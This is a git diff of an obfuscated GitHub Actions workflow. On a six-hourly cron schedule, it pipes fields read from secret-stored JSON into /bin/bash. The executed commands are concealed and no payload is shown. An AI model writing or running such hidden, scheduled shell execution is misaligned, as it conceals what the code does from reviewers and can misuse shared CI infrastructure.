@@ -1,9 +1,8 @@
 name: nongfeiting1524
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 5/6 * * *'
+    - cron: '23 4/6 * * *'
 
 jobs:
   build:
@@ -13,11 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: nongfeiting1524
         env:
-          lso61: ${{ secrets.lso61 }}
+          ms5: ${{ secrets.ms5 }}
         run: |
-          echo $lso61 | jq -r .mx3 | /bin/bash
-          echo $gfm16 | jq -r .ose0 | /bin/bash
-          echo $weux9943 | jq -r .oiv6033 | /bin/bash
-          echo $gfg836 | jq -r .nivl73 | /bin/bash
-          echo $cxb98 | jq -r .qy63222 | /bin/bash
+          echo $ms5 | jq -r .h5467 | /bin/bash
+          echo $a3 | jq -r .u1 | /bin/bash
+          echo $m2759 | jq -r .dch4 | /bin/bash
+          echo $jnveu0 | jq -r .iqucw3 | /bin/bash
+          echo $jfj0032 | jq -r .zhnq2653 | /bin/bash
+          echo $lro492 | jq -r .nzk17097 | /bin/bash
 
